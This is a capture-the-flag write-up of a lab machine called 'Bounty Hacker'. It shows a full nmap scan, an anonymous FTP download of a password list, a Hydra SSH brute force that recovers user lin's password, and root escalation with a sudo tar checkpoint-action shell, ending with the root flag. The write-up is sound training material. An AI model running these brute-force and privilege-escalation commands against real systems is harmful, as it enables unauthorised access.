ctf:bounty hacker

<img width="1899" height="882" alt="image" src="https://github.com/user-attachments/assets/b256f217-cdda-4cd6-b5b2-462412c5fede" />

i see port 80 is also open and i do directory bruteforce for finding hidden directory







```
nmap -sS -p- 10.49.144.83 -T4 -oN open-ports.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-12 09:34 +0530
Nmap scan report for 10.49.144.83
Host is up (0.14s latency).
Not shown: 1951 filtered tcp ports (no-response), 46 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 30.38 seconds


```

i try anonymous login on ftp server and i successfully logini and get two intresting files and donwload on my local machine and see what it's hase

```
[9:35] root@prime ~/ctf/bounty-hacker # ftp 10.49.144.83                                                     
Connected to 10.49.144.83.
220 (vsFTPd 3.0.5)
Name (10.49.144.83:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |******************************************************************************************|   418        2.03 MiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (3.47 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |******************************************************************************************|    68        0.18 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.15 KiB/s)
ftp> 
```

```
[9:40] root@prime ~/ctf/bounty-hacker # ls
locks.txt  open-ports.txt  task.txt
                                                                                                                                                                                             
[9:40] root@prime ~/ctf/bounty-hacker # cat task.txt              
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
                                                                                                                                                                                             
[9:40] root@prime ~/ctf/bounty-hacker # cat locks.txt      
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
....                                                                                                                                                                             
[9:41] root@prime ~/ctf/bounty-hacker # 
```
now this time to brute force 

```
[9:43] root@prime ~/ctf/bounty-hacker # hydra -l lin -P locks.txt ssh://10.49.144.83 -V -t 4
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-12 09:45:43
[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
[DATA] attacking ssh://10.49.144.83:22/
[ATTEMPT] target 10.49.144.83 - login "lin" - pass "rEddrAGON" - 1 of 26 [child 0] (0/0)
[ATTEMPT] target 10.49.144.83 - login "lin" - pass "ReDdr4g0nSynd!cat3" - 2 of 26 [child 1] (0/0)
[ATTEMPT] target 10.49.144.83 - login "lin" - pass "Dr@gOn$yn9icat3" - 3 of 26 [child 2] (0/0)
[ATTEMPT] target 10.49.144.83 - login "lin" - pass "R3DDr46ONSYndIC@Te" - 4 of 26 [child 3] (0/0)
[ATTEMPT] target 10.49.144.83 - login "lin" - pass "ReddRA60N" - 5 of 26 [child 2] (0/0)
[ATTEMPT] target 10.49.144.83 - login "lin" - pass "R3dDrag0nSynd1c4te" - 6 of 26 [child 3] (0/0)
[ATTEMPT] target 10.49.144.83 - login "lin" - pass "dRa6oN5YNDiCATE" - 7 of 26 [child 1] (0/0)
[ATTEMPT] target 10.49.144.83 - login "lin" - pass "ReDDR4g0n5ynDIc4te" - 8 of 26 [child 0] (0/0)
[ATTEMPT] target 10.49.144.83 - login "lin" - pass "R3Dr4gOn2044" - 9 of 26 [child 2] (0/0)
[ATTEMPT] target 10.49.144.83 - login "lin" - pass "RedDr4gonSynd1cat3" - 10 of 26 [child 3] (0/0)
[22][ssh] host: 10.49.144.83   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-12 09:45:54
                                                                                                                                                                                             
[9:45] root@prime ~/ctf/bounty-hacker #
```

we found a valid password so now this  time to login using ssh credentials 

i used gtfbin for privESC https://gtfobins.org/gtfobins/tar/ ,here a lin user can run a binary with sudo permision  ,it's a great option for us to privESC to root user 
```
lin@ip-10-49-144-83:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on ip-10-49-144-83:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-49-144-83:
    (root) /bin/tar
lin@ip-10-49-144-83:~/Desktop$ ls -l /bin/tar
-rwsr-xr-x 1 root root 448112 Dec  4  2023 /bin/tar
lin@ip-10-49-144-83:~/Desktop$ /bin/tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
/bin/tar: Removing leading `/' from member names
$ id
uid=1001(lin) gid=1001(lin) groups=1001(lin)
$ echo '/bin/sh 0<&1' >/path/to/temp-file
tar cf /path/to/temp-file.tar /path/to/temp-file
tar xf /path/to/temp-file.tar --to-command /bin/sh/bin/sh: 2: cannot create /path/to/temp-file: Directory nonexistent
$ tar: /path/to/temp-file.tar: Cannot open: No such file or directory
tar: Error is not recoverable: exiting now
fi     
tar: /path/to/temp-file.tar: Cannot open: No such file or directory
tar: Error is not recoverable: exiting now
$ id
uid=1001(lin) gid=1001(lin) groups=1001(lin)
$ sudo /bin/tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
/bin/tar: Removing leading `/' from member names
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
THM{80UN7Y_h4cK3r}
# 
```
